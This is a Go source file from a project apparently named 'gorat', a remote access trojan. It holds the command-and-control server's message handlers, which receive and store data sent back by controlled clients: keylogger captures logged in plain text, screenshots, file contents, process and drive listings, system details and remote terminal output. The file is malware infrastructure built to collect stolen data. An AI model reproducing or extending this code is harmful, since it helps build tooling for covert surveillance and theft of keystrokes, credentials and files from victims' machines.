package messaging

import (
"log"
"time"

"gorat/common"
)

// HeartbeatHandler handles heartbeat messages
type HeartbeatHandler struct {
	updater ClientMetadataUpdater
}

// NewHeartbeatHandler creates a new heartbeat handler
func NewHeartbeatHandler(updater ClientMetadataUpdater) *HeartbeatHandler {
	return &HeartbeatHandler{updater: updater}
}

// MessageType returns the message type this handler processes
func (h *HeartbeatHandler) MessageType() common.MessageType {
	return common.MsgTypeHeartbeat
}

// Handle processes a heartbeat message
func (h *HeartbeatHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var hb common.HeartbeatPayload
	if err := msg.ParsePayload(&hb); err != nil {
		return nil, err
	}

	h.updater.UpdateClientMetadata(clientID, func(m *common.ClientMetadata) {
m.Status = hb.Status
m.LastHeartbeat = time.Now()
	})

	return nil, nil
}

// CommandResultHandler handles command result messages
type CommandResultHandler struct {
	store ResultStore
}

// NewCommandResultHandler creates a new command result handler
func NewCommandResultHandler(store ResultStore) *CommandResultHandler {
	return &CommandResultHandler{store: store}
}

// MessageType returns the message type this handler processes
func (h *CommandResultHandler) MessageType() common.MessageType {
	return common.MsgTypeCommandResult
}

// Handle processes a command result message
func (h *CommandResultHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var cr common.CommandResultPayload
	if err := msg.ParsePayload(&cr); err != nil {
		log.Printf("Command result from %s: %s", clientID, string(msg.Payload))
		return nil, err
	}

	log.Printf("Command result from %s: success=%v, exit_code=%d", clientID, cr.Success, cr.ExitCode)
	h.store.SetCommandResult(clientID, &cr)
	return nil, nil
}

// FileListHandler handles file list messages
type FileListHandler struct {
	store ResultStore
}

// NewFileListHandler creates a new file list handler
func NewFileListHandler(store ResultStore) *FileListHandler {
	return &FileListHandler{store: store}
}

// MessageType returns the message type this handler processes
func (h *FileListHandler) MessageType() common.MessageType {
	return common.MsgTypeFileList
}

// Handle processes a file list message
func (h *FileListHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var fl common.FileListPayload
	if err := msg.ParsePayload(&fl); err != nil {
		log.Printf("File list from %s", clientID)
		return nil, err
	}

	log.Printf("File list from %s: %d files", clientID, len(fl.Files))
	h.store.SetFileListResult(clientID, &fl)
	return nil, nil
}

// DriveListHandler handles drive list messages
type DriveListHandler struct {
	store ResultStore
}

// NewDriveListHandler creates a new drive list handler
func NewDriveListHandler(store ResultStore) *DriveListHandler {
	return &DriveListHandler{store: store}
}

// MessageType returns the message type this handler processes
func (h *DriveListHandler) MessageType() common.MessageType {
	return common.MsgTypeDriveList
}

// Handle processes a drive list message
func (h *DriveListHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var dl common.DriveListPayload
	if err := msg.ParsePayload(&dl); err != nil {
		log.Printf("Drive list from %s", clientID)
		return nil, err
	}

	log.Printf("Drive list from %s: %d drives", clientID, len(dl.Drives))
	h.store.SetDriveListResult(clientID, &dl)
	return nil, nil
}

// ProcessListHandler handles process list messages
type ProcessListHandler struct {
	store ResultStore
}

// NewProcessListHandler creates a new process list handler
func NewProcessListHandler(store ResultStore) *ProcessListHandler {
	return &ProcessListHandler{store: store}
}

// MessageType returns the message type this handler processes
func (h *ProcessListHandler) MessageType() common.MessageType {
	return common.MsgTypeProcessList
}

// Handle processes a process list message
func (h *ProcessListHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var pl common.ProcessListPayload
	if err := msg.ParsePayload(&pl); err != nil {
		log.Printf("Process list from %s", clientID)
		return nil, err
	}

	log.Printf("Process list from %s: %d processes", clientID, len(pl.Processes))
	h.store.SetProcessListResult(clientID, &pl)
	return nil, nil
}

// SystemInfoHandler handles system info messages
type SystemInfoHandler struct {
	store ResultStore
}

// NewSystemInfoHandler creates a new system info handler
func NewSystemInfoHandler(store ResultStore) *SystemInfoHandler {
	return &SystemInfoHandler{store: store}
}

// MessageType returns the message type this handler processes
func (h *SystemInfoHandler) MessageType() common.MessageType {
	return common.MsgTypeSystemInfo
}

// Handle processes a system info message
func (h *SystemInfoHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var si common.SystemInfoPayload
	if err := msg.ParsePayload(&si); err != nil {
		log.Printf("System info from %s", clientID)
		return nil, err
	}

	log.Printf("System info from %s: %s (%s %s)", clientID, si.Hostname, si.OS, si.Arch)
	h.store.SetSystemInfoResult(clientID, &si)
	return nil, nil
}

// FileDataHandler handles file data messages
type FileDataHandler struct {
	store ResultStore
}

// NewFileDataHandler creates a new file data handler
func NewFileDataHandler(store ResultStore) *FileDataHandler {
	return &FileDataHandler{store: store}
}

// MessageType returns the message type this handler processes
func (h *FileDataHandler) MessageType() common.MessageType {
	return common.MsgTypeFileData
}

// Handle processes a file data message
func (h *FileDataHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var fd common.FileDataPayload
	if err := msg.ParsePayload(&fd); err != nil {
		log.Printf("File data from %s", clientID)
		return nil, err
	}

	log.Printf("File data from %s: %s (%d bytes)", clientID, fd.Path, len(fd.Data))
	h.store.SetFileDataResult(clientID, &fd)
	return nil, nil
}

// ScreenshotDataHandler handles screenshot data messages
type ScreenshotDataHandler struct {
	store ResultStore
}

// NewScreenshotDataHandler creates a new screenshot data handler
func NewScreenshotDataHandler(store ResultStore) *ScreenshotDataHandler {
	return &ScreenshotDataHandler{store: store}
}

// MessageType returns the message type this handler processes
func (h *ScreenshotDataHandler) MessageType() common.MessageType {
	return common.MsgTypeScreenshotData
}

// Handle processes a screenshot data message
func (h *ScreenshotDataHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var sd common.ScreenshotDataPayload
	if err := msg.ParsePayload(&sd); err != nil {
		log.Printf("Screenshot received from %s", clientID)
		return nil, err
	}

	log.Printf("Screenshot received from %s: %dx%d, %d bytes", clientID, sd.Width, sd.Height, len(sd.Data))
	h.store.SetScreenshotResult(clientID, &sd)
	return nil, nil
}

// KeyloggerDataHandler handles keylogger data messages
type KeyloggerDataHandler struct{}

// NewKeyloggerDataHandler creates a new keylogger data handler
func NewKeyloggerDataHandler() *KeyloggerDataHandler {
	return &KeyloggerDataHandler{}
}

// MessageType returns the message type this handler processes
func (h *KeyloggerDataHandler) MessageType() common.MessageType {
	return common.MsgTypeKeyloggerData
}

// Handle processes a keylogger data message
func (h *KeyloggerDataHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var kld common.KeyloggerDataPayload
	if err := msg.ParsePayload(&kld); err != nil {
		return nil, err
	}

	log.Printf("Keylogger data from %s: %s", clientID, kld.Keys)
	return nil, nil
}

// UpdateStatusHandler handles update status messages
type UpdateStatusHandler struct{}

// NewUpdateStatusHandler creates a new update status handler
func NewUpdateStatusHandler() *UpdateStatusHandler {
	return &UpdateStatusHandler{}
}

// MessageType returns the message type this handler processes
func (h *UpdateStatusHandler) MessageType() common.MessageType {
	return common.MsgTypeUpdateStatus
}

// Handle processes an update status message
func (h *UpdateStatusHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var us common.UpdateStatusPayload
	if err := msg.ParsePayload(&us); err != nil {
		return nil, err
	}

	log.Printf("Update status from %s: %s - %s", clientID, us.Status, us.Message)
	return nil, nil
}

// TerminalOutputHandler handles terminal output messages
type TerminalOutputHandler struct {
	terminalOutputFn func(sessionID string, data string, isError bool)
}

// NewTerminalOutputHandler creates a new terminal output handler
func NewTerminalOutputHandler(terminalOutputFn func(sessionID string, data string, isError bool)) *TerminalOutputHandler {
	return &TerminalOutputHandler{terminalOutputFn: terminalOutputFn}
}

// MessageType returns the message type this handler processes
func (h *TerminalOutputHandler) MessageType() common.MessageType {
	return common.MsgTypeTerminalOutput
}

// Handle processes a terminal output message
func (h *TerminalOutputHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	var to common.TerminalOutputPayload
	if err := msg.ParsePayload(&to); err != nil {
		return nil, err
	}

	h.terminalOutputFn(to.SessionID, to.Data, false)
	return nil, nil
}

// PongHandler handles pong messages (heartbeat response)
type PongHandler struct{}

// NewPongHandler creates a new pong handler
func NewPongHandler() *PongHandler {
	return &PongHandler{}
}

// MessageType returns the message type this handler processes
func (h *PongHandler) MessageType() common.MessageType {
	return common.MsgTypePong
}

// Handle processes a pong message
func (h *PongHandler) Handle(clientID string, msg *common.Message) (interface{}, error) {
	// Pong is just a heartbeat response, no action needed
	return nil, nil
}
